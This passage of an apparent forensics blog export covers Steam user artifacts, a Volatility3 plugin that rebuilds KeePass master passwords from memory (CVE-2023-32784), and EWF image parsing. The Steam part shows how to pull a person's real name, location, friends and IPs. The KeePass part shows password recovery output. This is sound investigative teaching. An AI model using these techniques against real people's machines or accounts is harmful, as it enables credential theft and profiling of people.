format.\\n\\nContent:\\n\\n```JSON\\n\\"users\\"\\n{\\n\\t\\"76561199524123422232\\"\\n\\t{\\n\\t\\t\\"AccountName\\"\\t\\t\\"Jean\\"\\n\\t\\t\\"PersonaName\\"\\t\\t\\"superjean\\"\\n\\t\\t\\"RememberPassword\\"\\t\\t\\"1\\"\\n\\t\\t\\"WantsOfflineMode\\"\\t\\t\\"0\\"\\n\\t\\t\\"SkipOfflineModeWarning\\"\\t\\t\\"0\\"\\n\\t\\t\\"AllowAutoLogin\\"\\t\\t\\"1\\"\\n\\t\\t\\"MostRecent\\"\\t\\t\\"1\\"\\n\\t\\t\\"Timestamp\\"\\t\\t\\"1688740727\\"\\n\\t}\\n}\\n```\\nUsing the Steam ID, one can retrive more information about the community profile by browsing to `https://steamcommunity.com/actions/ajaxresolveusers?steamids=[STEAM_ID]`.\\n\\nJSON result:\\n```JSON\\n[\\n    {\\n    \\"steamid\\":\\"765231213229864\\",\\n    \\"accountid\\":15623422136,\\n    \\"persona_name\\":\\"superjean\\",\\n    \\"avatar_url\\":\\"0000000000000000000000000000000000000000\\",\\n    \\"profile_url\\":\\"\\",\\n    \\"persona_state\\":1,\\n    \\"city\\":\\"Athabasca\\",\\n    \\"state\\":\\"Alberta\\",\\n    \\"country\\":\\"CA\\",\\n    \\"real_name\\":\\"Jean Pierre\\",\\n    \\"is_friend\\":false,\\n    \\"friends_in_common\\":0\\n    }\\n]\\n```\\n> **Note :** there is no need to be authenticated to Steam to retrive those data.\\n\\n## Friends\\n\\nLocations:\\n- Windows 10 : `%programfiles(x86)%\\\\Steam\\\\userdata\\\\[account ID]\\\\config\\\\localconfig.vdf`\\n- Ubuntu : `$HOME/.local/share/Steam/userdata/[account ID]/config/localconfig.vdf`\\n- MacOS : `$HOME/Library/Application Support/Steam/userdata/[account ID]/config/localconfig.vdf`\\n\\n\\nThe user\'s friend list can be found at the begining of the file under the \\"friends\\" section.\\n```JSON\\n[...]\\n\\t\\"friends\\"\\n\\t{\\n\\t\\t\\"1232434343\\"\\n\\t\\t{\\n\\t\\t\\t\\"NameHistory\\"\\n\\t\\t\\t{\\n\\t\\t\\t\\t\\"0\\"\\t\\t\\"superjean\\"\\n\\t\\t\\t}\\n\\t\\t\\t\\"avatar\\"\\t\\t\\"8376ba022787d9a86309b7b2b68e9994056c06e7\\"\\n\\t\\t\\t\\"name\\"\\t\\t\\"superjean\\"\\n\\t\\t}\\n\\t\\t\\"PersonaName\\"\\t\\t\\"superjean\\"\\n\\t\\t\\"communitypreferences\\"\\t\\t\\"1800280130013800\\"\\n\\n\\t\\t\\"11132322\\"\\n\\t\\t{\\n\\t\\t\\t\\"name\\"\\t\\t\\"Pierre\\"\\n\\t\\t\\t\\"NameHistory\\"\\n\\t\\t\\t{\\n\\t\\t\\t\\t\\"0\\"\\t\\t\\"Pierre\\"\\n\\t\\t\\t}\\n\\t\\t\\t\\"avatar\\"\\t\\t\\"9f0c155db20221ade1ca5e1de4a705049f540bac\\"\\n\\t\\t}\\n[...]\\n    }\\n```\\n\\nThe first ID is always the account ID of the user you are investigating (the user is friend with himself). Next, all of his friends are listed alongside with their ID.\\n\\nTo recover more information about the user\'s friend one may use the following request :\\n\\nhttps://steam-chat.com/miniprofile/ACCOUNT_ID/json/\\n\\nThis request has to be made online; it is usefull to see if the user changed his informations when performing the post-mortem analysis.\\n\\nWith this, the investigator will be able to confirm :\\n- The user\'s friend name (may have changed  when performing the post-mortem analysis)\\n- Retrive the profile picture (can be great to build a graph).\\n\\n\\n## Owned and Installed games\\nInside `localconf.vdf` it is also indicated the games owned by the user, the last play time and how much time he spend on each game:\\n```JSON\\n[...]\\n\\"Software\\"\\n\\t{\\n\\t\\t\\"valve\\"\\n\\t\\t{\\n\\t\\t\\t\\"Steam\\"\\n\\t\\t\\t{\\n\\t\\t\\t\\t\\"apps\\"\\n\\t\\t\\t\\t{\\n\\t\\t\\t\\t\\t\\"7\\"\\n\\t\\t\\t\\t\\t{\\n\\t\\t\\t\\t\\t\\t\\"cloud\\"\\n\\t\\t\\t\\t\\t\\t{\\n\\t\\t\\t\\t\\t\\t\\t\\"last_sync_state\\"\\t\\t\\"synchronized\\"\\n\\t\\t\\t\\t\\t\\t}\\n\\t\\t\\t\\t\\t}\\n\\t\\t\\t\\t\\t\\"760\\"\\n\\t\\t\\t\\t\\t{\\n\\t\\t\\t\\t\\t\\t\\"cloud\\"\\n\\t\\t\\t\\t\\t\\t{\\n\\t\\t\\t\\t\\t\\t\\t\\"quota_bytes\\"\\t\\t\\"20000000000\\"\\n\\t\\t\\t\\t\\t\\t\\t\\"quota_files\\"\\t\\t\\"50000\\"\\n\\t\\t\\t\\t\\t\\t\\t\\"used_bytes\\"\\t\\t\\"2177105\\"\\n\\t\\t\\t\\t\\t\\t\\t\\"used_files\\"\\t\\t\\"12\\"\\n\\t\\t\\t\\t\\t\\t}\\n\\t\\t\\t\\t\\t}\\n[...]\\n                }\\n            }\\n        }\\n    }\\n```\\n\\nMaking a similar request with the Steam app id, one can retrive the metadata about the installed game to make better user profiling:\\n\\nRequest : `https://store.steampowered.com/api/libraryappdetails/?appid=[STEAM_APP_ID]&l=english`\\n\\n\\n## Connected device(s)\\n\\nLocations:\\n- Windows 10 :  `%programfiles(x86)%\\\\Steam\\\\config\\\\remoteclients.vdf`\\n- Ubuntu : `$HOME/.local/share/Steam/config/remoteclients.vdf`\\n- MacOS : `$HOME/Library/Application Support/Steam/config/remoteclients.vdf`\\n\\n\\nThe remote client cache can tell us about the hostnames and public IP adresses that were recently used to connect to Steam (via browser or desktop application). It might be possible to even guess the operating system that were used if some default naming conventions were used. In the bellow example, we can guess that the source OS is probably Windows.\\n\\n```JSON\\n\\"RemoteClientCache\\"\\n{\\n\\t\\"1012008522321213291784\\"\\n\\t{\\n\\t\\t\\"hostname\\"\\t\\t\\"DESKTOP-3QEVFIQ\\"\\n\\t\\t\\"lastupdated\\"\\t\\t\\"1688740718\\"\\n\\t\\t\\"lastresult\\"\\t\\t\\"20\\"\\n\\t\\t\\"ippublic\\"\\t\\t\\"193.43.70.103\\"\\n\\t\\t\\"apps\\"\\n\\t\\t{\\n\\t\\t}\\n\\t}\\n\\t\\"32802461232113594\\"\\n\\t{\\n\\t\\t\\"hostname\\"\\t\\t\\"DESKTOP-BNO4NTQ\\"\\n\\t\\t\\"lastupdated\\"\\t\\t\\"1688740718\\"\\n\\t\\t\\"lastresult\\"\\t\\t\\"20\\"\\n\\t\\t\\"ippublic\\"\\t\\t\\"193.43.70.103\\"\\n\\t\\t\\"apps\\"\\n\\t\\t{\\n\\t\\t}\\n\\t}\\n}\\n```\\n\\n## Application logs\\nThere is a lot of logs saved linked to the activity of the application. They can be usefull to obtain more context in some cases.\\n\\nLocations:\\n- Windows 10 :  `%programfiles(x86)%\\\\Steam\\\\logs\\\\`\\n- Ubuntu : `$HOME/.local/share/Steam/logs/`\\n- MacOS : `$HOME/Library/Application Support/Steam/logs/`\\n\\nExample :\\n```r\\n[...]\\n[2023-07-07 18:44:03] Loaded store \'machineuser\' from \'[...]/Library/Application Support/Steam/local.vdf\' successfully\\n[2023-07-07 18:51:20] Flushed store \'userlocal\' to \'[...]/Library/Application Support/Steam/userdata/[...]/config/localconfig.vdf\'\\n[2023-07-07 19:06:57] Flushed store \'userlocal\' to \'[...]/Library/Application Support/Steam/userdata/[...]/config/localconfig.vdf\'\\n[2023-07-07 19:21:46] Flushed store \'userlocal\' to \'[...]/Library/Application Support/Steam/userdata/[...]/config/localconfig.vdf\'\\n[2023-07-07 19:35:46] Flushed store \'userlocal\' to \'[...]/Library/Application Support/Steam/userdata/[...]/config/localconfig.vdf\'\\n[2023-07-07 19:57:25] Flushed store \'install\' to \'[...]/Library/Application Support/Steam/config/config.vdf\'\\n```\\n\\n# What about the user conversations ?\\nUnfortunately the user conversations are not saved on disk but on the Steam\'s servers. The channel used to send messages is encrypted through a socket using X509 certificates. You might be able to get those by collaborating with the Steam organization if you are law enforcement. It might be possible to retrieve conversations in the web browser cache or by using memory analysis though I did not dig into any of these hypotheses yet.\\n\\n\\n# Conclusion\\nTo conclude this article, we were able to retrieve a good amount of information about the user. Those artifacts were found from my own research, there might be more interesting artifacts that were missed when preparing this blog article. If you are looking to automate your artifacts collection, a python library [^2] exists to parse vdf files. Hopping it will help you when performing your investigations. Do not hesitate to reach me at felix.guyard@forensicxlab.com to enhance this article.\\n\\n[^1]: https://github.com/obsidianforensics/hindsight/\\n[^2]: https://github.com/ValvePython/vdf"},{"id":"keepass","metadata":{"permalink":"/blog/keepass","source":"@site/blog/2023-05-19-keepass/index.md","title":"\ud83d\udce6 Volatility3 Windows Plugin - KeePass","description":"On May 1st, 2023, vdhoney raised concerns about a flaw he found impacting KeePass 2.X.. Vdhoney claimed to be able to reconstruct the master password from memory.","date":"2023-05-19T00:00:00.000Z","tags":[{"inline":true,"label":"DFIR","permalink":"/blog/tags/dfir"},{"inline":true,"label":"Memory Forensics","permalink":"/blog/tags/memory-forensics"},{"inline":true,"label":"KeePass","permalink":"/blog/tags/kee-pass"},{"inline":true,"label":"Windows","permalink":"/blog/tags/windows"}],"readingTime":5.02,"hasTruncateMarker":true,"authors":[{"name":"k1nd0ne","title":"Digital Forensics Spiderman","url":"https://github.com/k1n0ne","page":{"permalink":"/blog/authors/k-1-nd-0-ne"},"socials":{"x":"https://x.com/k1nd0ne","github":"https://github.com/k1nd0ne","bluesky":"https://bsky.app/profile/k1nd0ne.bsky.social"},"imageURL":"https://avatars.githubusercontent.com/u/27780432?v=4","key":"k1nd0ne"}],"frontMatter":{"slug":"keepass","title":"\ud83d\udce6 Volatility3 Windows Plugin - KeePass","authors":["k1nd0ne"],"tags":["DFIR","Memory Forensics","KeePass","Windows"]},"unlisted":false,"prevItem":{"title":"\ud83d\udd26 Video Games Forensics - Steam","permalink":"/blog/steam"},"nextItem":{"title":"\ud83d\udd26 Debunking the Expert Witness Compression Format (EWF)","permalink":"/blog/ewf"}},"content":"On May 1st, 2023, vdhoney[^1] raised concerns about a flaw he found impacting KeePass 2.X.[^2]. Vdhoney claimed to be able to reconstruct the master password from memory.\\nA POC [^3] was later released by the researcher not only in dotnet but also in python3[^4].\\n\\nToday in this blog post we will describe the vulnerability and see how we can create a volatility3 plugin to help forensics investigators to retrieve passwords from memory.\\n\\n\\n[^1]: https://sourceforge.net/u/v2023/profile/\\n[^2]: https://sourceforge.net/p/keepass/discussion/329220/thread/f3438e6283/\\n[^3]: https://github.com/vdohney/keepass-password-dumper\\n[^4]: https://github.com/CMEPW/keepass-dump-masterkey\\n[^5]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-32784\\n\\n\x3c!-- truncate --\x3e\\n\\n\\n## Vulnerability description\\nThe vulnerability (CVE-2023-32784 [^5]) resides in the basic KeePass version 2.X written in .NET. This version utilizes its own custom-made text box named SecureTextBoxEx, not only for the master password entry dialog but also in other parts of the program such as password edit boxes. Though this use case is not likely to be used by users as it is a bad practice, it should be noted that the flaw does not cover the scenario where the master password was copied from a clipboard.\\nFrom this observation, Vdohney built up a method to recover that scattered information from memory. Indeed, this text box produces left over strings when a password is entered. For example, when \u201cHello\u201d is typed, the following strings remain present in memory \u201c\u2022e, \u2022\u2022l, \u2022\u2022\u2022l, \u2022\u2022\u2022\u2022o\u201d. One can find more details about this vulnerability on vdhoney\u2019s github [^3].\\n\\n\\n## The KeePass volatility3 plugin\\nAs a forensics investigator, you might have actual (or past) cases where KeePass 2.X process activities were retrieved. Using volatility3, it is possible to list the running processes using the \u201cpslist\u201d or \u201cpsscan\u201d plugin.\\n\\n```\\n~/work/DFIR/Memory Analysis/MemoryImages/KeePassMachine \xbb vol -f KeePassMachine.mem windows.pslist\\nVolatility 3 Framework 2.4.1\\nProgress:  100.00\\t\\tPDB scanning finished\\nPID\\tPPID\\tImageFileName\\tOffset(V)\\tThreads\\tHandles\\tSessionId\\tWow64\\tCreateTime\\tExitTime\\tFile output\\n\\n4\\t0\\tSystem\\t0x9908d5a87040\\t136\\t-\\tN/A\\tFalse\\t2023-05-19 14:20:08.000000 \\tN/A\\tDisabled\\n108\\t4\\tRegistry\\t0x9908d5af6080\\t4\\t-\\tN/A\\tFalse\\t2023-05-19 14:20:04.000000 \\tN/A\\tDisabled\\n412\\t4\\tsmss.exe\\t0x9908dabd8040\\t2\\t-\\tN/A\\tFalse\\t2023-05-19 14:20:08.000000 \\tN/A\\tDisabled\\n532\\t516\\tcsrss.exe\\t0x9908dac800c0\\t11\\t-\\t0\\tFalse\\t2023-05-19 14:20:32.000000 \\tN/A\\tDisabled\\n628\\t516\\twininit.exe\\t0x9908db831080\\t3\\t-\\t0\\tFalse\\t2023-05-19 14:20:32.000000 \\tN/A\\tDisabled\\n648\\t620\\tcsrss.exe\\t0x9908db847140\\t13\\t-\\t1\\tFalse\\t2023-05-19 14:20:32.000000 \\tN/A\\tDisabled\\n700\\t628\\tservices.exe\\t0x9908db894080\\t7\\t-\\t0\\tFalse\\t2023-05-19 14:20:32.000000 \\tN/A\\tDisabled\\n740\\t620\\twinlogon.exe\\t0x9908db8a4080\\t3\\t-\\t1\\tFalse\\t2023-05-19 14:20:32.000000 \\tN/A\\tDisabled\\n796\\t628\\tlsass.exe\\t0x9908db8c8080\\t6\\t-\\t0\\tFalse\\t2023-05-19 14:20:32.000000 \\tN/A\\tDisabled\\n912\\t700\\tsvchost.exe\\t0x9908db936240\\t13\\t-\\t0\\tFalse\\t2023-05-19 14:20:32.000000 \\tN/A\\tDisabled\\n1716\\t912\\tdllhost.exe\\t0x9908de764080\\t5\\t-\\t1\\tFalse\\t2023-05-19 14:23:07.000000 \\tN/A\\tDisabled\\n4888\\t700\\tSgrmBroker.exe\\t0x9908df512080\\t7\\t-\\t0\\tFalse\\t2023-05-19 14:23:08.000000 \\tN/A\\tDisabled\\n7820\\t912\\tWmiPrvSE.exe\\t0x9908da4f7080\\t4\\t-\\t0\\tFalse\\t2023-05-19 14:23:26.000000 \\tN/A\\tDisabled\\n4272\\t4528\\tFTK Imager.exe\\t0x9908da509080\\t12\\t-\\t1\\tFalse\\t2023-05-19 14:23:42.000000 \\tN/A\\tDisabled\\n4100\\t700\\tWUDFHost.exe\\t0x9908de9a3080\\t5\\t-\\t0\\tFalse\\t2023-05-19 14:23:43.000000 \\tN/A\\tDisabled\\n2868\\t912\\tShellExperienc\\t0x9908dec2c080\\t9\\t-\\t1\\tFalse\\t2023-05-19 14:23:45.000000 \\tN/A\\tDisabled\\n7684\\t912\\tRuntimeBroker.\\t0x9908d7f0d2c0\\t3\\t-\\t1\\tFalse\\t2023-05-19 14:23:46.000000 \\tN/A\\tDisabled\\n752\\t4528\\tKeePass.exe\\t0x9908da51b300\\t4\\t-\\t1\\tFalse\\t2023-05-19 14:25:34.000000 \\tN/A\\tDisabled\\n6344\\t700\\tsvchost.exe\\t0x9908dd88a080\\t5\\t-\\t0\\tFalse\\t2023-05-19 14:25:49.000000 \\tN/A\\tDisabled\\n```\\n\\nIn this example we can see that the KeePass process was running on the host machine. The PID retrieved is \u201c752\u201d.\\nUsing volatility3, one can dump this process layer and retrieve all the sections linked to the virtual address spaces. Once completed, one can map virtual pages to physical pages and extract the residing data.\\n\\nA custom plugin allows to parse the data to isolate the relevant patterns (in this case \u201c\u25cf\u201d) seeking to further attempt the reconstruction of the master KeePass password entered by a user. The plugin can be found here: https://github.com/forensicxlab/volatility3_plugins/blob/main/keepass.py\\n\\n\\nBy passing the PID of the process to the volatility3 KeePass plugin, one can try to reconstruct the master password:\\n\\n```\\n~/work/DFIR/Memory Analysis/MemoryImages/KeePassMachine \xbb vol -f KeePassMachine.mem windows.keepass --pid 752                                                                                                          k1nd0ne@MacBook-Pro-de-Felix\\nVolatility 3 Framework 2.4.1\\nProgress:  100.00\\t\\tPDB scanning finished\\nOffset\\tSize\\tConstructed_Password\\n\\n0x3ba6000\\t0x1000\\tu\\n0x3ba7000\\t0x1000\\tup\\n0x3ba7000\\t0x1000\\tupe\\n0x3ba8000\\t0x1000\\tuper\\n0x3ba9000\\t0x1000\\tuperM\\n0x3ba9000\\t0x1000\\tuperMa\\n0x3baa000\\t0x1000\\tuperMa\\n0x3baa000\\t0x1000\\tuperMas\\n0x3bab000\\t0x1000\\tuperMast\\n0x3bab000\\t0x1000\\tuperMaste\\n0x3bac000\\t0x1000\\tuperMaste\\n0x3bac000\\t0x1000\\tuperMaster\\n0x3bad000\\t0x7000\\tuperMasterP\\n0x3bad000\\t0x7000\\tuperMasterPa\\n0x3bad000\\t0x7000\\tuperMasterPas\\n0x3bad000\\t0x7000\\tuperMasterPass\\n0x3bad000\\t0x7000\\tuperMasterPassw\\n0x3bad000\\t0x7000\\tuperMasterPasswo\\n0x3bad000\\t0x7000\\tuperMasterPasswor\\n0x3bad000\\t0x7000\\tuperMasterPassword\\n0x7ffbf8ac5000\\t0x1000\\tuperMasterPassword\\n0x96e545bd2000\\t0x1000\\t{u,,}perMasterPassword\\n0xc58000400000\\t0x200000\\t{u,&,o}perMasterPassword\\n0xf80564600000\\t0x1200000\\t{u,&,,,J}perMasterPassword\\n0xf805737d3000\\t0x1f000\\t{u,&,,,o, }perMasterPassword\\n```\\n\\nEven if the first character of the password is not store in memory, the latter can be however easily brute forced.\\n\\n## Conclusion\\n\\nTo conclude this article, we demonstrated that the reconstruction of a master password of Keepass can be implemented into volatility3 framework via a custom plugin. The discovery of new memory extraction techniques is helping the field of digital forensics and specially law enforcement agencies that are now able to access memory from devices in a more efficient and non-destructive way. This methodology could be valuable in solving actual incident cases, including past ones where the memory was retrieved and stored and keepass master password remained unbroke.\\n\\n\\n>This plugin was tested on a Win10 22H2 memory image. Do not hesitate to reach me at felix.guyard@forensicxlab.com to enhance this article."},{"id":"ewf","metadata":{"permalink":"/blog/ewf","source":"@site/blog/2023-05-11-ewf/index.md","title":"\ud83d\udd26 Debunking the Expert Witness Compression Format (EWF)","description":"As a digital forensic expert, proving the authenticity and reliability of a forensic image in court is essential. Indeed, the integrity of the data needs to be maintained during the imaging process, preventing any accidental or intentional modification of the data.","date":"2023-05-11T00:00:00.000Z","tags":[{"inline":true,"label":"EWF","permalink":"/blog/tags/ewf"},{"inline":true,"label":"Digital Forensics","permalink":"/blog/tags/digital-forensics"}],"readingTime":10.9,"hasTruncateMarker":true,"authors":[{"name":"k1nd0ne","title":"Digital Forensics Spiderman","url":"https://github.com/k1n0ne","page":{"permalink":"/blog/authors/k-1-nd-0-ne"},"socials":{"x":"https://x.com/k1nd0ne","github":"https://github.com/k1nd0ne","bluesky":"https://bsky.app/profile/k1nd0ne.bsky.social"},"imageURL":"https://avatars.githubusercontent.com/u/27780432?v=4","key":"k1nd0ne"}],"frontMatter":{"slug":"ewf","title":"\ud83d\udd26 Debunking the Expert Witness Compression Format (EWF)","authors":["k1nd0ne"],"tags":["EWF","Digital Forensics"]},"unlisted":false,"prevItem":{"title":"\ud83d\udce6 Volatility3 Windows Plugin - KeePass","permalink":"/blog/keepass"},"nextItem":{"title":"\ud83e\uddec Malware Analysis with VISION-ProcMon","permalink":"/blog/vision"}},"content":"As a digital forensic expert, proving the authenticity and reliability of a forensic image in court is essential. Indeed, the integrity of the data needs to be maintained during the imaging process, preventing any accidental or intentional modification of the data.\\nThe Expert Witness Compression Format (EWF) provides a way to store metadata about the image, such as the source device, imaging tool, checksums, signatures, and other relevant information about the acquired media. This imaging format main feature is its compression capability thus reducing the size of the resulting image file. Compression allows for faster analysis of the data and reduces storage requirements.\\nThis article is meant to vulgarize the structures behind an EWF Segment. The reader will discover the main algorithms to use in order to be able to read and seek inside such image format. Finally, a proof of concept writen in rust will be shared to the reader.\\n\\n\x3c!-- truncate --\x3e\\n\\n\\n## Filesystem layers of abstraction\\n\\nBefore getting right into the main subject of this article, it is important to learn or get a little reminder about the filesystem concepts, vocabulary, and the underlying layers of abstractions.\\nLet us take the Unix filesystem concept as an example. Below is a vulgarized representation of the main layers of abstraction.\\n\\n\\n![alt text](../images/ewf/1.png \\"Filesystem layout\\")\\n\\nA storage medium (hard drive, SSD, \u2026) have the necessary set of electronics to create an abstraction of the Logical Block Addressing. It can be viewed as contiguous sequence of sectors. A sector is the smallest accessible unit on a drive (typically 512 bytes for disk drives).  It is possible to create a group multiple sectors and form a block.  Blocks are the smallest accessible units on a filesystem.  Each filesystem type can have their own concepts to represents files, directories, hardware devices etc...\\nThe exploitation system is supplying the abstraction of those human friendly concepts via the kernel to perform various actions on the filesystem (read, write, seek...).\\n\\nDigital forensics is performed on a copy of the media to be investigated. This can be done with various tools (FTK Imager, EnCase, dd, Falcon, others\u2026) and produce an image that can have various format (raw, img, ewf, vmdk, vdi\u2026) to be analyzed later without performing the investigation on the original media.\\n\\nFrom a forensics perspective, when a storage media is acquired, the investigator needs to find a way to emulate all the necessary abstraction layers in order to extract specific artifacts usefull to an investigation without tempering with the data. Forensics tools are providing such abstraction and capabilities. Most of those tools support different image format. One of these formats is well known and largely used: the Expert Witness Compressing Format (EWF).\\n\\n\\n![alt text](../images/ewf/2.png \\"Filesystem abstraction\\")\\n\\n\\n## The Expert Witness Compression Format\\n\\nThe Expert Witness Compression Format (EWF) is a forensic image output format created by the ASRDATA company. It can be used to create a bit-by-bit copy of a digital device. It includes both data and metadata, such as the partition table and other information about the device. EWF is designed to maintain the integrity of the original data and can be compressed to reduce storage requirements. It is widely used to preserve evidence for analysis and investigation both by law enforcement, digital forensics and incident response companies. This format is not so easy to understand because it is a proprietary file format, thus the purpose of this blog article. Luckily, the opensource community provide a C library and a nice documentation about this file format [^1]. Let\u2019s try to have a nice mental representation of the components of an EWF image.\\n\\n### The segments\\nAn EWF image can be divided into multiple segment files (there can also be a unique segment file). Those segments files have a consecutive extension system: Starting from \u201cE01\u201d to \u201cE99\u201d, then in alphabetical order from \u201cEAA\u201d to \u201cZZZ\u201d. Dividing a large sized media evidence source into multiple segments is a great way to prevent a large and unique raw output file that can sometime creates problems on some filesystem. Each segment file is composed of a **Header** and multiple **Sections**.\\n\\n\\n#### The EWF file Header and Sections\\n\\nLet\u2019s now dive into the components of a EWF segment file.\\n\\n![alt text](../images/ewf/3.png \\"EWF structure\\")\\n\\nThe EWF is storing the source evidence image\u2019s sectors inside **chunks**. A chunk is just a group of sectors. There is a finite number of chunks per segments. Therefore, the information about the sectors and chunks needs to be known if we want to read them.\\n\\n#### The segment file Header\\nEach segment file has a **Header** (do not confuse the **segment file header** with the **section header** described later). The file header contains a signature (or a magic number) of 8 bytes that attest of its format:\\n\\n![alt text](../images/ewf/4.png \\"Header\\")\\n\\n\\nIn this example, the signature is: \u201cEVF\\\\0x09\\\\0x0d\\\\0x0a\\\\0xff\\\\0x00\u201d\\n\\nThe file header also contains the information about the **first section offset** and the segment number.\\n\\n#### The sections\\n\\nThe sections are the metadata of the image used by the tools to be able to read the evidence sectors and get other various information about the acquired evidence (checksums, acquisition tool used, timestamps etc\u2026). Each section starts with metadata describing itself:\\n- Its type (header, volume, \u2026)\\n- Its size\\n- The next section offset\\n\\nHere is what important information you can extract from each section:\\n-\\t**The header section -** Not to be confused with the segment file header described earlier, it contains information about the acquired media (case number, Evidence Number, Examiner name, etc.). Each acquisition tools have their own way of describing what information reside in this section.\\n-\\t**The \u201cvolume\u201d or \u201cdisk\u201d section \u2013** It contains critical information about the sectors and the chunks of the acquired media that will help the investigator to parse the EWF file like the chunk count, the size of a chunk, the size of a sector, the number of sectors per chunk.\\n-\\t**The sector section \u2013** It contains the actual chunks of the acquired evidence. Now, the main advantage about EWF is that some of the chunks can be compressed to gain space on the destination storage using the zlib compression algorithm. Therefore, we need to know what the offsets of each chunk are and if it is compressed chunk or not.\\n-\\t**The table section \u2013** This section is like a table of pointers that will tell the investigator where to find each chunk and if it is compressed. The most significant bit (MSB) of each pointer indicates if the chunk is compressed (1) or uncompressed (0).\\n-\\t**The \u201cend\u201d or \u201cnext\u201d section \u2013** The \u201cend\u201c section indicates that this segment file was the last one. However, the \u201cnext\u201d section indicates that there is another segment to parse.\\n\\nYou can now understand better the image showed at the beginning. To have more details about each section, the libewf project is providing a good documentation [^2].\\n\\n\\n### Parsing the EWF Segments\\n\\nNow that you have a better understanding of this file format, you want to be able to write a code to create the abstraction layer needed to read data like a standard disk and beginning the extraction of evidence.\\n\\n\\n#### Step 1: Parsing all the useful metadata from each segment.\\nFirst, we want to be able to read chunks, we first need to extract all the necessary metadata about those chunks from each segment. To hold all the important metadata, we can create multiple structures to store them. Here is an example of what you can do.\\n\\n\\n![alt text](../images/ewf/5.png \\"EWF structure\\")\\n\\n\\nHere, the purple color corresponds to a Structure or an Object. The red color represents an HashMap or a Dictionary with a key and a value. The blue color is a vector. You\u2019ll notice that we have created the structures representing the different headers and sections of an EWF Segment. Our main goal is:\\n-\\tTo know where all the segment file descriptors are. (segments)\\n-\\tTo store all the chunk for each segment (chunks).\\n-\\tTo store all the end of sector offset for each segment (end_of_sectors).\\n-\\tTo know what is the current chunk that the EWF structure points to (CachedChunk).\\nTo understand better here are the structure definitions of a Chunk and a CachedChunk:\\n\\n![alt text](../images/ewf/6.png \\"Chunk structure\\")\\n\\n\\nTo parse a segment here is a pseudo-code algorithm:\\n```\\nAlgorithm: parse_segment\\nParameters: self: The EWF Structure, file: the current segment.\\nReturn value: EwfSegment filled with all the information about the chunks\\n\\nBegin:\\n\\t\\t// Parsing EWF Header\\n    self.ewf_header <- new EwfHeader(file)\\n    current_offset <- 0xd // We place our self just after the EWFHeader.\\n    ewf_section_descriptor_size <- 0x4c\\n    extracted_chunks <- []\\n\\n    begin loop:\\n        // Parsing EWF section descriptor\\n        section <- new EwfSectionDescriptor(file, current_offset)\\n        section_offset <- section.next_section_offset\\n        section_size <- section.section_size\\n        section_type <- section.section_type_def\\n        self.sections.push(section) // Save the section into a vector\\n\\n        // Saving header information\\n        if section_type == \\"header\\" or section_type == \\"header2\\":\\n            self.header <- new EwfHeaderSection(file, current_offset+ewf_section_descriptor_size, self.sections.last())\\n\\n        // Saving volume information\\n        if section_type == \\"disk\\" or section_type == \\"volume\\":\\n            self.volume <- new EwfVolumeSection(file, current_offset+ewf_section_descriptor_size)\\n\\n        // Extracting chunks from table section\\n        if section_type == \\"table\\":\\n            extracted_chunks.extend(self.parse_table(&file, current_offset+ewf_section_descriptor_size)) //We save our chunks structure.\\n\\n        // Saving end of sectors information\\n        if section_type == \\"sectors\\":\\n            self.end_of_sectors.insert(self.ewf_header.segment_number, current_offset + section_size)\\n\\n        // Checking if the current section is done\\n        if current_offset == section_offset or section_type == \\"done\\":\\n            break\\n\\n        // Updating the offset to go throught the segment file.\\n        current_offset <- section_offset\\n    end loop\\n    // Saving segment and extracted chunks information\\n    self.segments.push(file)\\n    self.chunks.insert(self.ewf_header.segment_number, extracted_chunks)\\n    return self\\nEnd\\n```\\n\\nNotice that this function is calling other parsing functions and data structures that I did not describe in pseudo-code. The main goal is to understand the main parsing routine.\\n\\n#### Step 2: Read an arbitrary chunk.\\nNow that we have save all our chunks, we can create a function to read the chunk number **X** from the given segment number **Y**.\\n\\nReading a chunk includes checking if it is a compressed chunk. And if so, decompressing its data before.\\n\\n1.\\tTo read the data from a chunk number in a segment file here are the steps to follow :\\n2.\\tCheck if the given chunk number is valid for the given segment using the \u201cchunks\u201d dictionary in our EWF structure. If not, it raises an error.\\n3.\\tUse the following variables:\\n- data: An empty buffer of bytes to store the read data.\\n- chunk: A reference to the chunk object in the segment.\\n- start_offset: The starting position in the segment where the chunk data is located.\\n- end_offset: The ending position in the segment where the chunk data is located (for compressed chunks).\\n4.\\tSeek to the starting position of the chunk data in the segment.\\n5.\\tIf the chunk is not compressed, read data from the segment into a buffer.\\n6.\\tIf the chunk is compressed, decode the compressed data using Zlib [^4] and store the result in the data buffer.\\n7.\\tReturn the data buffer containing the chunk data.\\n\\nWe can now read the data from any chunk number in a given segment!\\n\\n#### Step 3: Create a standard read\\nNow the last step is to create a read function to imitate the traditional read system call [^3] on a POSIX system. To perform this task here are the steps for a given number of bytes to read:\\n1. Check if there is any cached chunk data available. If not, read the first chunk of the first segment and set it as the cached chunk data.\\n2. Loop until the size is zero.\\n3. If the remaining size of the data to be read is less than or equal to the remaining data in the cached chunk, update the buffer with the remaining data. Then update the cached chunk pointer and size.\\n4. If the remaining size is greater than the remaining cached chunk data, update the buffer with all the remaining cached chunk data and calculate the remaining size of the data to be read.\\n5. Check if there are more chunks to be read or if the end of the segments has been reached. If there are more chunks, get the next chunk number and read that chunk\'s data.\\n6. Otherwise, return the buffer that has been read so far (nothing more to read).\\n\\n\\n## Proof of concept\\n\\nNow that we have finished the theorical part, I am sharing to you a proof of concept written in rust. The code can be found here: https://github.com/forensicxlab/EWF\\n\\n\\n![alt text](../images/ewf/8.png \\"POC\\")\\n\\n\\nThis code will show you all the important metadata about the parsed segments. It is capable of:\\n-\\tReading and seeking through the sectors of an EWF image.\\n-\\tParsing the MBR.\\n-\\tCalculate the original media signature (MD5 of all the sectors).\\n\\n\\n## Conclusion\\nTo conclude this blogpost, we were able to create the abstraction layer needed to read an EWF image. We can now identify partitions and create other abstraction layer to read files, reconstruct a system tree etc\u2026 This can be the subject of future blogposts. Do not hesitate to reach me at felix.guyard@forensicxlab.com to make this article better.\\n\\n\\n[^1]: https://github.com/libyal/libewf/blob/main/documentation/Expert%20Witness%20Compression%20Format%20(EWF).asciidoc\\n[^2]: https://github.com/libyal/libewf\\n[^3]: https://en.wikipedia.org/wiki/Read_(system_call)\\n[^4]: https://www.zlib.net/"},{"id":"vision","metadata":{"permalink":"/blog/vision","source":"@site/blog/2023-02-27-vision/index.md","title":"\ud83e\uddec Malware Analysis with VISION-ProcMon","description":"Malware analysis is very useful when performing a digital investigation. Indeed, identifying how a malware works and determining its 